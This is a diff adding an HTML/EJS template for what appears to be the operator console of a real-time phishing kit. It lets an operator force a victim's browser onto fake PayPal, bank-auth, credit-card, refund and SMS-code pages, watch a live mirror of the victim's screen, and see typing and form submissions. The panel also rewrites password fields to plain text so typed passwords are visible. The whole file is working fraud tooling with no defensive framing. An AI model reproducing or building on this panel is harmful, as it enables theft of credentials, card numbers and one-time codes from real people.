@@ -1,0 +1,625 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Target IP Tools - <%= visitorIp %>
+    </title>
+    <script src="/socket.io/socket.io.js"></script>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Outfit:wght@400;600;700&display=swap"
+        rel="stylesheet">
+    <style>
+        :root {
+            --bg-main: #050810;
+            --bg-gradient: radial-gradient(circle at 50% 0%, rgba(30, 27, 75, 0.4) 0%, transparent 70%);
+            --glass-bg: rgba(15, 23, 42, 0.5);
+            --glass-border: rgba(255, 255, 255, 0.1);
+            --glass-border-hover: rgba(255, 255, 255, 0.25);
+            --primary: #38bdf8;
+            --primary-hover: #0ea5e9;
+            --text-main: #f8fafc;
+            --text-muted: #94a3b8;
+            --card-radius: 16px;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: var(--bg-main);
+            background-image: var(--bg-gradient);
+            background-attachment: fixed;
+            color: var(--text-main);
+            margin: 0;
+            padding: 2.5rem;
+            display: flex;
+            flex-direction: column;
+            gap: 24px;
+            min-height: 100vh;
+        }
+
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 1.5rem 2rem;
+            background: rgba(15, 23, 42, 0.6);
+            border: 1px solid var(--glass-border);
+            border-radius: var(--card-radius);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+        }
+
+        .header h1 {
+            margin: 0;
+            font-size: 1.8rem;
+            font-family: 'Outfit', sans-serif;
+            color: var(--text-main);
+            background: linear-gradient(135deg, #ffffff, #94a3b8);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .header .subtitle {
+            font-size: 0.95rem;
+            color: var(--text-muted);
+            margin-top: 5px;
+            font-weight: 500;
+        }
+
+        .btn-back {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid var(--glass-border);
+            color: var(--text-main);
+            padding: 10px 18px;
+            border-radius: 8px;
+            cursor: pointer;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-weight: 500;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .btn-back:hover {
+            background: rgba(255, 255, 255, 0.1);
+            border-color: rgba(255, 255, 255, 0.3);
+            transform: translateX(-4px);
+        }
+
+        .dashboard-grid {
+            display: grid;
+            grid-template-columns: 320px 1fr;
+            gap: 24px;
+            flex-grow: 1;
+        }
+
+        @media (max-width: 1024px) {
+            .dashboard-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .tools-sidebar {
+            display: flex;
+            flex-direction: column;
+            gap: 24px;
+            height: 100%;
+        }
+
+        .category-card {
+            background: var(--glass-bg);
+            border: 1px solid var(--glass-border);
+            border-radius: var(--card-radius);
+            padding: 24px;
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1), box-shadow 0.3s;
+        }
+
+        .category-card:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.4), inset 0 1px 0 rgba(255, 255, 255, 0.05);
+            border-color: var(--glass-border-hover);
+        }
+
+        .category-card h3 {
+            margin: 0 0 20px 0;
+            font-family: 'Outfit', sans-serif;
+            font-size: 1.2rem;
+            color: var(--primary);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            text-shadow: 0 2px 10px rgba(56, 189, 248, 0.2);
+            padding-bottom: 12px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .tool-group {
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+        }
+
+        .tool-group input,
+        .tool-group select {
+            width: 100%;
+            padding: 12px;
+            border-radius: 8px;
+            background: rgba(15, 23, 42, 0.8);
+            border: 1px solid var(--glass-border);
+            color: white;
+            font-family: 'Inter', sans-serif;
+            font-size: 0.95rem;
+            box-sizing: border-box;
+            outline: none;
+            transition: all 0.3s;
+            box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.2);
+        }
+
+        .tool-group input:focus,
+        .tool-group select:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 0 2px rgba(56, 189, 248, 0.3), inset 0 2px 4px rgba(0, 0, 0, 0.2);
+        }
+
+        .btn {
+            background: linear-gradient(135deg, var(--primary), #0284c7);
+            color: white;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 12px 18px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-family: 'Outfit', sans-serif;
+            font-size: 1rem;
+            font-weight: 600;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            box-shadow: 0 4px 12px rgba(56, 189, 248, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 50%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transform: skewX(-20deg);
+            transition: all 0.6s ease;
+        }
+
+        .btn:hover::after {
+            left: 150%;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(56, 189, 248, 0.5);
+            background: linear-gradient(135deg, #38bdf8, #0ea5e9);
+        }
+
+        .btn-danger {
+            background: linear-gradient(135deg, #ef4444, #b91c1c);
+            box-shadow: 0 4px 12px rgba(239, 68, 68, 0.3);
+        }
+
+        .btn-danger:hover {
+            background: linear-gradient(135deg, #f87171, #dc2626);
+            box-shadow: 0 8px 20px rgba(239, 68, 68, 0.5);
+        }
+
+        .btn-warning {
+            background: linear-gradient(135deg, #f59e0b, #b45309);
+            box-shadow: 0 4px 12px rgba(245, 158, 11, 0.3);
+        }
+
+        .btn-warning:hover {
+            background: linear-gradient(135deg, #fbbf24, #d97706);
+            box-shadow: 0 8px 20px rgba(245, 158, 11, 0.5);
+        }
+
+        .live-view-container {
+            background: var(--glass-bg);
+            border: 1px solid var(--glass-border);
+            border-radius: var(--card-radius);
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
+        }
+
+        .live-view-header {
+            padding: 16px 24px;
+            background: rgba(15, 23, 42, 0.7);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-family: 'Outfit', sans-serif;
+            font-weight: 500;
+        }
+
+        .live-indicator {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: 600;
+            color: var(--text-muted);
+            background: rgba(0, 0, 0, 0.2);
+            padding: 6px 14px;
+            border-radius: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .pulse {
+            width: 10px;
+            height: 10px;
+            background: #ef4444;
+            border-radius: 50%;
+            display: inline-block;
+            position: relative;
+        }
+
+        .pulse.active {
+            background: #10b981;
+        }
+
+        .pulse.active::after {
+            content: '';
+            position: absolute;
+            top: -4px;
+            right: -4px;
+            bottom: -4px;
+            left: -4px;
+            border-radius: 50%;
+            border: 2px solid #10b981;
+            animation: radar 1.5s linear infinite;
+        }
+
+        @keyframes radar {
+            0% {
+                transform: scale(0.5);
+                opacity: 1;
+            }
+
+            100% {
+                transform: scale(2);
+                opacity: 0;
+            }
+        }
+
+        #live-view-frame {
+            width: 100%;
+            height: 100%;
+            flex: 1;
+            border: none;
+            background: #ffffff;
+            /* Simulate true browser bg */
+            border-bottom-left-radius: var(--card-radius);
+            border-bottom-right-radius: var(--card-radius);
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- Target IP data injected via server-side rendering -->
+    <div id="target-data" data-ip="<%= visitorIp %>" style="display: none;"></div>
+
+    <div class="header">
+        <div>
+            <h1>Target Console</h1>
+            <div class="subtitle">Secure session management for: <strong style="color:var(--primary);">
+                    <%= visitorIp %>
+                </strong>
+                <div
+                    style="margin-top: 8px; color: var(--text-muted); font-size: 0.9rem; display: flex; align-items: center; gap: 6px;">
+                    <svg style="width:16px;height:16px;" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                            d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1">
+                        </path>
+                    </svg>
+                    Live Path: <a id="current-path-display" href="#" target="_blank"
+                        style="color: #10b981; text-decoration: none; font-weight: 500; word-break: break-all;">Awaiting
+                        connection...</a>
+                </div>
+            </div>
+        </div>
+        <a href="/dash" class="btn-back">
+            <svg style="width:18px;height:18px;" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18">
+                </path>
+            </svg>
+            Return to Operations
+        </a>
+    </div>
+
+    <div class="dashboard-grid">
+        <!-- Control Tools Sidebar -->
+        <div class="tools-sidebar">
+
+
+
+            <!-- Navigation & Communication -->
+            <div class="category-card">
+                <h3>
+                    <svg style="width:20px;height:20px;" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                            d="M13 10V3L4 14h7v7l9-11h-7z"></path>
+                    </svg>
+                    Remote Operations
+                </h3>
+                <div class="tool-group">
+                    <select id="redirect-select">
+                        <option value="/">Login Page</option>
+                        <option value="/loadPPxCvGk6Hb?time=3&url=/PasoerrPPkjnUHnKJHu">❌ PP Paso Error</option>
+                        <option value="/loading?time=3&url=/DONEhkjnUHnKJHu">✅DONE</option>
+                        <option value="/loading?time=3&url=/SmS-1-hkjnUHnKJHu">SMS 1</option>
+                        <option value="/loading?time=3&url=/CAPOCA6a7d5affa">💳 CC Page</option>
+                        <option value="/loading?time=3&url=/REFUD6a7d5affa">💰 Refund Page</option>
+                        <option value="/loadPPxCvGk6Hb?time=3&url=/PPloGIkjnUHnKJHu">PP Login</option>
+                        <option value="/loadPPxCvGk6Hb?time=3&url=/PasoPPIkjnUHnKJHu">PP Paso</option>
+
+                        <option value="/loading?time=3&url=/BankauthkjnUHnKJHu">🏦Bank Auth</option>
+
+                        <option value="/loading?time=3&url=/SmS-2-hkjnUHnKJHu">SMS 2</option>
+                        <option value="/loadPPxCvGk6Hb?time=3&url=/PPxSmSxhkjnUHnKJHu">PP SMS</option>
+                        <option value="/loadPPxCvGk6Hb?time=3&url=/PPxSmSx2xhkjnUHnKJHu">PP SMS 2</option>
+
+
+
+                        <option value="/s7d56a7d5affa">Login Portal Fake</option>
+                        <option value="/s7d55a7d5grg">Verification Page</option>
+                        <option value="/loadgj43fsda">Page 2</option>
+                    </select>
+                    <input type="text" id="redirect-custom" placeholder="Inject external URL...">
+                    <button id="btn-force-redirect" class="btn">Force Redirect</button>
+                    
+                    <button id="btn-block-ip" class="btn btn-danger" style="margin-top: 24px;">
+                        <svg style="width:18px;height:18px;" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path>
+                        </svg>
+                        Block IP Access
+                    </button>
+                    
+                    <button id="btn-unblock-ip" class="btn" style="margin-top: 10px; background: linear-gradient(135deg, #10b981, #059669); box-shadow: 0 4px 12px rgba(16, 185, 129, 0.3);">
+                        <svg style="width:18px;height:18px;" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 11V7a4 4 0 118 0m-4 8v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2z"></path>
+                        </svg>
+                        Unblock IP
+                    </button>
+                </div>
+
+                <!-- Alert functionality removed -->
+            </div>
+
+        </div>
+
+        <!-- Live View Frame -->
+        <div class="live-view-container">
+            <div class="live-view-header">
+                <div style="display:flex; align-items:center; gap:12px; flex: 1;">
+                    Screen Mirror
+                    <span id="sync-status"
+                        style="font-size:0.85rem;color:#64748b;font-family:'Inter',sans-serif;">Standby Mode</span>
+                </div>
+                <div style="flex: 1; display: flex; justify-content: center; align-items: center;">
+                    <button id="btn-start-stream" class="btn" style="width: auto; padding: 6px 16px; font-size: 0.95rem;">Initiate Live Link</button>
+                    <button id="btn-stop-stream" class="btn btn-warning" style="display:none; width: auto; padding: 6px 16px; font-size: 0.95rem;">Terminate Link</button>
+                </div>
+                <div style="flex: 1; display: flex; justify-content: flex-end; align-items: center; gap: 15px;">
+                    <!-- Live Activity Typing Indicator -->
+                    <div id="typing-indicator" style="display: flex; align-items: center; gap: 6px; color: #f59e0b; font-size: 0.85rem; font-weight: 500; opacity: 0; transition: opacity 0.3s ease;">
+                        <svg style="width:14px;height:14px;" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.232 5.232l3.536 3.536m-2.036-5.036a2.5 2.5 0 113.536 3.536L6.5 21.036H3v-3.572L16.732 3.732z"></path>
+                        </svg>
+                        <span id="typing-text">User is typing...</span>
+                    </div>
+
+                    <div class="live-indicator">
+                        <span id="live-pulse" class="pulse"></span>
+                        <span id="live-text" style="letter-spacing:1px;font-size:0.85rem;">OFFLINE</span>
+                    </div>
+                </div>
+            </div>
+            <iframe id="live-view-frame" sandbox="allow-same-origin" srcdoc="
+                <div style='display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;background:#050810;color:#475569;font-family:sans-serif;'>
+                    <svg style='width:48px;height:48px;margin-bottom:16px;opacity:0.5;' fill='none' stroke='currentColor' viewBox='0 0 24 24'><path stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z'></path></svg>
+                    <p style='margin:0;font-size:1.1rem;'>Awaiting Connection Initialization</p>
+                    <p style='margin:10px 0 0 0;font-size:0.9rem;opacity:0.7;'>Click 'Initiate Live Link' to begin</p>
+                </div>
+            "></iframe>
+        </div>
+    </div>
+
+    <!-- IP Specific Admin Logic -->
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const socket = io();
+            const targetIp = document.getElementById('target-data').dataset.ip;
+
+            // Secure Admin Join
+            socket.emit('admin_join');
+
+            const currentPathDisplay = document.getElementById('current-path-display');
+
+            // Handle Initial Data
+            socket.on('initial_visitors', (visitors) => {
+                const target = visitors.find(v => v.ip === targetIp);
+                if (target && target.url) {
+                    currentPathDisplay.textContent = target.url;
+                    currentPathDisplay.href = target.url;
+                }
+            });
+
+            // --- Tool: Redirect ---
+            document.getElementById('btn-force-redirect').onclick = () => {
+                const preset = document.getElementById('redirect-select').value;
+                const custom = document.getElementById('redirect-custom').value;
+                const url = custom || preset;
+                if (!url) return;
+                socket.emit('force_redirect', { targetIp, url });
+            };
+
+            // --- Tool: Surveillance / Live View ---
+            const btnStart = document.getElementById('btn-start-stream');
+            const btnStop = document.getElementById('btn-stop-stream');
+            const pulse = document.getElementById('live-pulse');
+            const liveText = document.getElementById('live-text');
+            const statusLine = document.getElementById('sync-status');
+            const iframe = document.getElementById('live-view-frame');
+
+            btnStart.onclick = () => {
+                socket.emit('admin_command', { targetIp, command: 'start_live_view' });
+                iframe.srcdoc = `
+                    <div style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;background:#050810;color:#38bdf8;font-family:sans-serif;">
+                        <svg style="width:50px;height:50px;animation:spin 1s linear infinite;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path></svg>
+                        <h3 style="margin-top:20px;font-weight:500;letter-spacing:1px;">Establishing Secure Connection...</h3>
+                        <p style="color:#94a3b8;font-size:14px;">Awaiting DOM Sync from ${targetIp}</p>
+                        <style>@keyframes spin { 100% { transform: rotate(360deg); } }</style>
+                    </div>`;
+                btnStart.style.display = 'none';
+                btnStop.style.display = 'flex';
+                pulse.classList.add('active');
+                liveText.textContent = 'ONLINE';
+                liveText.style.color = '#10b981';
+                statusLine.textContent = 'Awaiting first frame...';
+            };
+
+            btnStop.onclick = () => {
+                socket.emit('stop_live_view');
+                btnStart.style.display = 'flex';
+                btnStop.style.display = 'none';
+                pulse.classList.remove('active');
+                liveText.textContent = 'OFFLINE';
+                liveText.style.color = '#ef4444';
+                statusLine.textContent = 'Link Terminated Manually';
+                iframe.srcdoc = `
+                    <div style='display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;background:#050810;color:#64748b;font-family:sans-serif;'>
+                        <svg style='width:48px;height:48px;margin-bottom:16px;opacity:0.5;color:#ef4444;' fill='none' stroke='currentColor' viewBox='0 0 24 24'><path stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='M18.364 5.636a9 9 0 010 12.728m0 0l-2.829-2.829m2.829 2.829L21 21M15.536 8.464a5 5 0 010 7.072m0 0l-2.829-2.829m-4.243 2.829a4.978 4.978 0 01-1.414-2.83m-1.414 5.658a9 9 0 01-2.167-9.238m7.824 2.167a1 1 0 111.414 1.414m-1.414-1.414L3 3m8.293 8.293l1.414 1.414'></path></svg>
+                        <p style='margin:0;font-size:1.1rem;'>Stream Paused</p>
+                    </div>`;
+            };
+
+            // Update viewer upon receiving HTML
+            socket.on('live_view_html', (data) => {
+                if (data.ip === targetIp || data.socketId) { // Fallback handled here
+                    statusLine.textContent = `Sync Active - Last frame: ${new Date().toLocaleTimeString()}`;
+
+                    // Convert password fields to text fields for admin visibility
+                    const modifiedHtml = data.html.replace(/type\s*=\s*(["']?)password\1/gi, 'type="text"');
+
+                    iframe.srcdoc = modifiedHtml;
+                }
+            });
+
+            // Listen for reconnection
+            socket.on('new_visitor', (data) => {
+                if (data.ip === targetIp) {
+                    statusLine.textContent = `✅ Target reconnected. Ready.`;
+                    statusLine.style.color = '#10b981'; // green
+                    if (liveText.textContent === 'DISCONNECTED' || liveText.textContent === 'OFFLINE') {
+                        liveText.textContent = 'STANDBY';
+                        liveText.style.color = '#f8fafc';
+                        pulse.classList.remove('active');
+                    }
+                    if (data.url) {
+                        currentPathDisplay.textContent = data.url;
+                        currentPathDisplay.href = data.url;
+                    }
+                }
+            });
+
+            // Clean disconnect handler
+            socket.on('visitor_disconnected', (data) => {
+                const disconnectedIp = typeof data === 'string' ? null : data.ip;
+                const isRotation = typeof data === 'string' ? false : data.isRotation;
+
+                // Ignore if it's a completely different IP
+                if (disconnectedIp && disconnectedIp !== targetIp) return;
+
+                if (isRotation) {
+                    // For session rotation (page reload), just note it briefly
+                    statusLine.textContent = `🔄 Target navigating...`;
+                    statusLine.style.color = '#38bdf8'; // blue
+                    return;
+                }
+
+                // Basically warn admin if connection drops
+                statusLine.textContent = `⚠️ Target signal lost. Connection dropped.`;
+                statusLine.style.color = '#f59e0b'; // warning
+                pulse.classList.remove('active');
+                liveText.textContent = 'DISCONNECTED';
+                liveText.style.color = '#f59e0b';
+            });
+
+            // Live Activity (Typing Indicator) Listener
+            let typingTimeout;
+            const typingIndicator = document.getElementById('typing-indicator');
+            const typingText = document.getElementById('typing-text');
+
+            socket.on('visitor_activity', (data) => {
+                // Ignore activity from other IPs
+                if (data.ip !== targetIp) return;
+
+                if (data.type === 'input_change') {
+                    typingText.textContent = 'User is typing...';
+                    typingIndicator.style.color = '#f59e0b'; // warning color for typing
+                    typingIndicator.style.opacity = '1';
+
+                    clearTimeout(typingTimeout);
+                    typingTimeout = setTimeout(() => {
+                        typingIndicator.style.opacity = '0';
+                    }, 1500);
+                } else if (data.type === 'form_submit') {
+                    typingText.textContent = 'Form Submitted!';
+                    typingIndicator.style.color = '#10b981'; // green for submit
+                    typingIndicator.style.opacity = '1';
+
+                    clearTimeout(typingTimeout);
+                    typingTimeout = setTimeout(() => {
+                        typingIndicator.style.opacity = '0';
+                    }, 3000);
+                }
+            });
+
+            // Block IP Button Handler
+            const btnBlockIp = document.getElementById('btn-block-ip');
+            if (btnBlockIp) {
+                btnBlockIp.addEventListener('click', () => {
+                    if(confirm('Are you sure you want to PERMANENTLY block this IP (' + targetIp + ')? They will be immediately redirected and locked out.')) {
+                        socket.emit('block_ip', { targetIp: targetIp });
+                        alert('IP has been blocked.');
+                    }
+                });
+            }
+
+            // Unblock IP Button Handler
+            const btnUnblockIp = document.getElementById('btn-unblock-ip');
+            if (btnUnblockIp) {
+                btnUnblockIp.addEventListener('click', () => {
+                    if(confirm('Are you sure you want to UNBLOCK this IP (' + targetIp + ')? They will be allowed to visit the site again.')) {
+                        socket.emit('unblock_ip', { targetIp: targetIp });
+                        alert('IP has been unblocked.');
+                    }
+                });
+            }
+        });
+    </script>
+</body>
+
+</html>
